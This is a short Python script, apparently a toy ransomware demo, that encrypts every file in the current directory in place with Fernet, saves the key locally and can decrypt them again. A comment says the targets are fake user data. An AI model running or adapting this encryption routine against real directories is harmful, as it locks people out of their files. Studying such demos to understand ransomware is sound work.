import os
from cryptography.fernet import Fernet


class ContextManager:
    pass


def get_files():
    cwd = os.getcwd()
    all_files_current_directory = []
    setattr(ContextManager, 'all_files_current_directory', all_files_current_directory)
    # get only files containing fake user data that will be encrypted
    for file in os.listdir(cwd):
        if file in ['.git', '.gitignore', 'README.md', 'setup.py', 'main.py', '.idea', 'decryption_key.txt']:
            continue
        ContextManager.all_files_current_directory.append(file)
    print(ContextManager.all_files_current_directory.append)


def generate_key():
    key = Fernet.generate_key()
    setattr(ContextManager, 'key', key)
    with open('decryption_key.txt', 'wb') as key:
        key.write(ContextManager.key)


def read_key():
    key = None
    setattr(ContextManager, 'key', key)
    with open('decryption_key.txt', 'rb') as key:
        ContextManager.key = key.read()


def encypt_files():
    get_files()
    generate_key()
    for file in ContextManager.all_files_current_directory:
        with open(file, 'rb') as target_file:
            content = target_file.read()
            encrypted_content = Fernet(ContextManager.key).encrypt(content)
        with open(file, 'wb') as target_file:
            target_file.write(encrypted_content)


def decypt_files():
    get_files()
    read_key()
    for file in ContextManager.all_files_current_directory:
        with open(file, 'rb') as target_file:
            content = target_file.read()
            decrypted_content = Fernet(ContextManager.key).decrypt(content)
        with open(file, 'wb') as target_file:
            target_file.write(decrypted_content)


if __name__ == '__main__':
    # encypt_files()
    decypt_files()
